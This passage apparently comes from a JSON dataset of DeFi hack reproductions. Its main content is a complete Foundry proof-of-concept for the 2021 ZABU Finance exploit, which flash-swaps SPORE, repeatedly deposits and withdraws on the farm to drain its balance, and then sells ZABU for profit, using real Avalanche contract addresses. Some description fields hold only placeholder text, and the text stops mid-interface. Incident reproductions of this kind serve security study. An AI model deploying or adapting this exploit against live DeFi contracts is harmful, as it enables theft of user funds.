                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "e40b8f1a6a",
        "is_ready": false,
        "content": "### 20210912 ZABU Finance - Deflationary token uncompatible\n#### Contract\n[ZABU_exp.sol](src/test/ZABU_exp.sol)\n### Link reference\nhttps://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29",
        "date": "20210912",
        "target": "ZABU Finance",
        "attack_title": "Deflationary token uncompatible",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/ZABU_exp.sol",
                "testcase": "pragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29\ninterface ZABUFarm{\n    function deposit(uint256 _pid, uint256 _amount) external;\n    function withdraw(uint256 _pid, uint256 _amount) external;\n    function emergencyWithdraw(uint256 _pid) external;\n}\ninterface PangolinRouter{\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline) external;\n}\ncontract depositToken{\n    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);\n    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);\n    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);\n    function depositSPORE() payable external{\n        address(WAVAX).call{value: 1 ether}(\"\");\n        address [] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(SPORE);\n        WAVAX.approve(address(Router), type(uint).max);\n        SPORE.approve(address(Farm), type(uint).max);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WAVAX.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n        Farm.deposit(uint256(38), SPORE.balanceOf(address(this)));\n    }\n    function withdrawSPORE() external{\n        Farm.withdraw(uint256(38), SPORE.balanceOf(address(Farm)));\n    }\n    function sellZABU() external{\n        address [] memory path = new address[](2);\n        path[0] = address(ZABU);\n        path[1] = address(WAVAX);\n        WAVAX.approve(address(Router), type(uint).max);\n        ZABU.approve(address(Router), type(uint).max);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(ZABU.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n}\ncontract ContractTest is DSTest{\n    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);\n    IERC20 PNG = IERC20(0x60781C2586D68229fde47564546784ab3fACA982);\n    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);\n    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);\n    Uni_Pair_V2 PangolinPair1 = Uni_Pair_V2(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE WAVAX\n    Uni_Pair_V2 PangolinPair2 = Uni_Pair_V2(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE PNG\n    address addressContract;\n    uint reserve0Pair1;\n    uint reserve1Pair1;\n    uint reserve0Pair2;\n    uint reserve1Pair2;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 4177751); \n    }\n    function testExploit() public payable {\n        SPORE.approve(address(Farm), type(uint).max);\n        WAVAX.approve(address(Router), type(uint).max);\n        (reserve0Pair1, reserve1Pair1,) = PangolinPair1.getReserves();\n        (reserve0Pair2, reserve1Pair2,) = PangolinPair2.getReserves();\n        address(WAVAX).call{value: 2500 ether}(\"\");\n        // depost SPORE\n        ContractFactory();\n        (bool success,) = addressContract.call{value: 1 ether}(abi.encodeWithSignature(\"depositSPORE()\"));\n        require(success);\n        // change block.number\n        cheats.roll(block.number + 900); \n        PangolinPair1.swap(SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18, 0, address(this), new bytes(1));\n        // change block.number\n        cheats.roll(block.number + 1001);\n        (bool success1,) = addressContract.call(abi.encodeWithSignature(\"withdrawSPORE()\"));\n        require(success1);\n        emit log_named_decimal_uint(\"Attacker ZABU profit after exploit\",\n            ZABU.balanceOf(addressContract),\n            18);\n        (bool success2,) = addressContract.call(abi.encodeWithSignature(\"sellZABU()\"));\n        require(success2);\n        emit log_named_decimal_uint(\"Attacker WAVAX profit after exploit\",\n            WAVAX.balanceOf(addressContract) - 2500 * 1e18,\n            18);\n    }\n    function pangolinCall(address sender, uint amount0, uint amount1, bytes calldata data) public{\n        if(msg.sender == address(PangolinPair1)){\n            PangolinPair2.swap(0, reserve1Pair2 - 1 * 1e18, address(this), new bytes(1));\n            // flashswap callback pair1\n            uint amountSPORE0 = SPORE.balanceOf(address(this));\n            SPORE.transfer(address(PangolinPair1), amountSPORE0);\n            uint SPOREInPair1  = SPORE.balanceOf(address(PangolinPair1));\n            uint WAVAXInPair1 = WAVAX.balanceOf(address(PangolinPair1));\n            uint amountWAVAX = \n                (reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000) - WAVAXInPair1) * 1000 / \n                997;\n            WAVAX.transfer(address(PangolinPair1), amountWAVAX);\n        }\n        if(msg.sender == address(PangolinPair2)){\n            //reduced lptoken\n            while(SPORE.balanceOf(address(Farm)) > 1000){\n            uint256 amount = SPORE.balanceOf(address(this));\n            if(SPORE.balanceOf(address(this)) * 6 / 100 > SPORE.balanceOf(address(Farm))){\n                amount = SPORE.balanceOf(address(Farm)) * 100 / 6;\n            }\n            Farm.deposit(uint256(38), amount);\n            Farm.withdraw(uint256(38), amount);\n            }\n            // flashswap callback pair2\n            uint amountSPORE1 = SPORE.balanceOf(address(this)) / 3;\n            SPORE.transfer(address(PangolinPair2), amountSPORE1);\n            uint SPOREInPari2 = SPORE.balanceOf(address(PangolinPair2));\n            uint PNGInPair2 =  PNG.balanceOf(address(PangolinPair2));            \n            uint amountPNG = \n                (reserve0Pair2 * reserve1Pair2 / ((SPOREInPari2 * 1000 - amountSPORE1 * 3 * 96 / 100) / 1000) - PNGInPair2) * 1000 / 997;             \n            buyPNG(amountPNG);\n            PNG.transfer(address(PangolinPair2), PNG.balanceOf(address(this)));\n        }\n        }\n    function ContractFactory() public{\n        address _add;\n        bytes memory bytecode = type(depositToken).creationCode;\n        assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), 1)\n            }\n        addressContract = _add;\n    }\n    function buyPNG(uint amount) public{\n        address [] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(PNG);\n        Router.swapTokensForExactTokens(amount,\n            WAVAX.balanceOf(address(this)),\n            path,\n            address(this),\n            block.timestamp);\n    }\n}",
                "token_count": 2060,
                "interfaces": [
                    {
                        "name": "ZABUFarm",
                        "content": "interface ZABUFarm{\n    function deposit(uint256 _pid, uint256 _amount) external;\n    function withdraw(uint256 _pid, uint256 _amount) external;\n    function emergencyWithdraw(uint256 _pid) external;\n}\n",
                        "token_count": 48,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  